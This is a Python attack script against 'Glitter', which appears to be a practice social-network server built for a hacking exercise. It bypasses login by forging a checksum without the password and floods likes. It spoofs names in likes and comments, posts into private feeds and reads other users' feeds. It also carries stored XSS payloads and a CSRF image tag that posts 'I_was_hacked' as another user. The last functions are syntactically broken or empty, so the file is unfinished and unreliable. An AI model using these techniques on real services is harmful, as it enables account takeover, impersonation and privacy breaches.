import socket
import time
import requests

SERVER_PORT = 1336
SERVER_IP = "44.224.228.136"
URL = "glitter.org.il"


def send_and_receive(sock, message):
    """
    a function to send a message and receive the server's response
    :param sock: the conversation socket
    :param message: the message to send to the server
    :type sock: socket
    :type message: str
    """
    sock.send(message.encode())
    try:
        response = sock.recv(8000).decode()
    except Exception as e:
        print("error recovering message from the server", e)
        return None
    return response


def calculate_checksum(username, password):
    """
    a function to calculate the checksum
    :param username: the user's username
    :param password: the user's password
    :type username: str
    :type password: str
    :return: the checksum
    :rtype: int
    """
    checksum = 0
    for char in username + password:
        checksum += ord(char)
    return checksum


def connect_to_server():
    """
    a function to connect to the server
    :return: the conversation socket
    :rtype: socket
    """
    global sock
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((SERVER_IP, SERVER_PORT))
    return sock


def login_with_checksum_bypass(username):
    """
    a function to login into the server (without password)
    :param username: the username of the profile we want to log into
    :type username: str
    :return: the conversation socket and the user id (if found)
    :rtype: tuple
    """
    global discovered_password
    sock = connect_to_server()
    dummy_password = "~*`'>``~"
    login_msg = '100#{gli&&er}{"user_name":"' + username + '","password":"' + dummy_password + '","enable_push_notifications":true}##'
    response = send_and_receive(sock, login_msg)
    print("Response: " + response)
    if "ascii checksum:" in response:
        checksum_start = response.find("ascii checksum: ") + 16
        checksum_end = response.find("{", checksum_start)
        required_checksum = int(response[checksum_start:checksum_end])
        print("Server requires checksum: " + str(required_checksum))
        current_sum = calculate_checksum(username, "")
        needed_for_password = required_checksum - current_sum
        if needed_for_password > 0:
            if needed_for_password < 127:
                password = chr(needed_for_password)
            else:
                password = "a" * (needed_for_password // 97)
        else:
            password = "1"
        discovered_password = password
        login_msg = '100#{gli&&er}{"user_name":"' + username + '","password":"' + password + '","enable_push_notifications":true}##'
        response = send_and_receive(sock, login_msg)
        print("Login response: " + response)
        if "Please complete ascii checksum" in response:
            checksum_msg = '110#{gli&&er}' + str(required_checksum) + '##'
            response = send_and_receive(sock, checksum_msg)
            print("Authentication response: " + response)
            if "Authentication approved" in response:
                print("Successfully bypassed authentication!")
                id_start = response.find('"id":') + 5
                id_end = response.find(',', id_start)
                user_id = response[id_start:id_end]
                return sock, user_id
    return sock, None


def send_multiple_likes(sock, user_id, glit_id, count):
    """
    a fucntion to like a glit multiple times from one user
    :param sock: the conversation socket
    :param user_id: the user's id
    :param glit_id: the id of the glit we want to like
    :param count: how many times to like the glit
    :type sock: socket
    :type user_id: str
    :type glit_id: str
    :type count: int
    :return: none
    """
    for i in range(count):
        like_msg = '710#{gli&&er}{"glit_id":' + glit_id + ',"user_id":' + user_id + ',"user_screen_name":"kolin jon"}##'
        response = send_and_receive(sock, like_msg)
        print("Like " + str(i + 1) + " response: " + response)
        time.sleep(0.5)


def send_like_with_fake_name(sock, user_id, glit_id, fake_name):
    """
    a function to like a glit with a fake name
    :param sock: the conversation socket
    :param user_id: the user's id
    :param glit_id: the id of the glit we want to like
    :param fake_name: the fake name we will like the glit
    :type sock: socket
    :type user_id: str
    :type glit_id: str
    :type fake_name: str
    :return: none
    """
    like_msg = '710#{gli&&er}{"glit_id":' + glit_id + ',"user_id":' + user_id + ',"user_screen_name":"' + fake_name + '"}##'
    response = send_and_receive(sock, like_msg)
    print("Response: " + response)


def send_glit_with_different_profile_image(sock, user_id, profile_image):
    """
    a function to send a glit with a whatever profile image the user would like to use (from im1 to im8)
    :param sock: the conversation socket
    :param user_id:the user's id
    :param profile_image: the image the user wants to send a glit with
    :type sock: socket
    :type user_id: str
    :type profile_image: str
    :return: none
    """
    global current_time
    current_time = time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime())
    glit_msg = '550#{gli&&er}{"feed_owner_id":' + user_id + ',"publisher_id":' + user_id + ',"publisher_screen_name":"kolin jon","publisher_avatar":"im' + profile_image + '","background_color":"White","date":"' + current_time + '","content":"message","font_color":"black","id":-1}##'
    response = send_and_receive(sock, glit_msg)
    print("Response: " + response)


def send_glit_from_past(sock, user_id):
    """
    a function to send a glit from the past
    :param sock: the conversation socket
    :param user_id:the user's id
    :type sock: socket
    :type user_id: str
    :return: none
    """
    past_date = "2000-06-17T11:54:58.220Z"
    glit_msg = '550#{gli&&er}{"feed_owner_id":' + user_id + ',"publisher_id":' + user_id + ',"publisher_screen_name":"kolin jon","publisher_avatar":"im3","background_color":"OrangeRed","date":"' + past_date + '","content":"Message from the past!","font_color":"black","id":-1}##'
    response = send_and_receive(sock, glit_msg)
    print("Response: " + response)


def access_other_user_feed(sock, target_user_id):
    """
    a function to access other user's feed using their user_id
    :param sock: the conversation socket
    :param target_user_id: the user_id of the target
    :type sock: socket
    :type target_user_id: str
    :return: none
    """
    feed_msg = '500#{gli&&er}{"feed_owner_id":' + target_user_id + ',"end_date":"2026-06-26T12:00:00.000Z","glit_count":10000}##'
    response = send_and_receive(sock, feed_msg)
    print("Feed response: " + response)


def send_to_private_account(sock, user_id, target_user_id):
    """
    a function to send a glit to a private account
    :param sock: the conversation socket
    :param user_id: the user's id
    :param target_user_id: the user_id of the target
    :type sock: socket
    :type user_id: str
    :type target_user_id: str
    :return: none
    """
    glit_msg = '550#{gli&&er}{"feed_owner_id":' + target_user_id + ',"publisher_id":' + user_id + ',"publisher_screen_name":"kolin jon","publisher_avatar":"im8","background_color":"Red","date":"' + current_time + '","content":"post from kolin jon on private feed!","font_color":"black","id":-1}##'
    response = send_and_receive(sock, glit_msg)
    print("Response: " + response)


def send_colored_font_glit(sock, user_id, color):
    """
    a function to send a glit with a colored font (not black
    :param sock: the conversation socket
    :param user_id: the user's id
    :param color: the user's desired text color
    :type sock: socket
    :type user_id: str
    :type color: str
    :return: none
    """
    glit_msg = '550#{gli&&er}{"feed_owner_id":' + user_id + ',"publisher_id":' + user_id + ',"publisher_screen_name":"kolin jon","publisher_avatar":"im1","background_color":"White","date":"' + current_time + '","content":"Colored text message!","font_color":"' + color + '","id":-1}##'
    response = send_and_receive(sock, glit_msg)
    print("Response: " +  response)


def send_xss_image_glit(sock, user_id):
    """
    a function to post a glit with a image using xss
    :param sock: the conversation socket
    :param user_id: the user's id
    :type sock: socket
    :type user_id: str
    :return: none
    """
    xss_payload = '''<img onload="window.open('https://www.google.com/', '_blank');" src="https://images.unsplash.com/photo-1481833761820-0509d3217039?auto=format&fit=crop&w=800&q=80" alt="Eiffel Tower in Heart Frame" />'''
    glit_msg = '550#{gli&&er}{"feed_owner_id":' + user_id + ',"publisher_id":' + user_id + ',"publisher_screen_name":"kolin jon","publisher_avatar":"im8","background_color":"White","date":"' + current_time + '","content":"' + xss_payload + '","font_color":"black","id":-1}##'
    response = send_and_receive(sock, glit_msg)
    print("Response: " + response)


def send_xss_link_glit(sock, user_id):
    """
    a function to post a glit with a clickable link using xss
    :param sock: the conversation socket
    :param user_id: the user's id
    :type sock: socket
    :type user_id: str
    :return: none
    """
    xss_link = '<a href=\\"javascript:alert(\'XSS\')\\" onclick=\\"alert(\'Clicked!\')\\">Click me</a>'
    glit_msg = '550#{gli&&er}{"feed_owner_id":' + user_id + ',"publisher_id":' + user_id + ',"publisher_screen_name":"kolin jon","publisher_avatar":"im8","background_color":"Teal","date":"' + current_time + '","content":"' + xss_link + '","font_color":"black","id":-1}##'
    response = send_and_receive(sock, glit_msg)
    print("Response: " + response)


def send_comment_fake_name(sock, user_id, glit_id, fake_name):
    """
    a function to comment on a glit with a fake name
    :param sock: the conversation socket
    :param user_id: the user's id
    :param glit_id: the id of the glit we want comment on with a fake name
    :param fake_name: the fake name that will be used as the fake name
    :type sock: socket
    :type user_id: str
    :type glit_id: str
    :type fake_name: str
    :return: none
    """
    comment_msg = '650#{gli&&er}{"glit_id":' + glit_id + ',"user_id":' + user_id + ',"user_screen_name":"' + fake_name + '","content":"Comment with fake name","date":"' + current_time + '"}##'
    response = send_and_receive(sock, comment_msg)
    print("Response: " + response)


def send_multiple_wows(sock, user_id, glit_id, count):
    """
    a function to post multiple wows on a glit
    :param sock: the conversation socket
    :param user_id: the user's id
    :param glit_id: the id of the glit we want to wow
    :param count: the amount of wows we will do
    :return: none
    """
    for i in range(count):
        wow_msg = '750#{gli&&er}{"glit_id":' + str(glit_id) + ',"user_id":' + str(user_id) + ',"user_screen_name":"kolin jon"}##'
        response = send_and_receive(sock, wow_msg)
        print("Wow " + str(i + 1) + " response: " + response)
        time.sleep(0.5)


def xsrf_send_message_to_yourself_from_another_user(user_id, publisher_id, text, ):
    <img src="http://glitter.org.il/glit?id=-1&feed_owner_id=21502&publisher_id=21509&publisher_screen_name=kolin%20pom&publisher_avatar=im1&background_color=White&date=2025-07-03T20%3A08%3A35.187Z&content=I_was_hacked&font_color=black">


def get_password(username):


def load_another_user_search_history(target_user_id):
    send_and_receive()
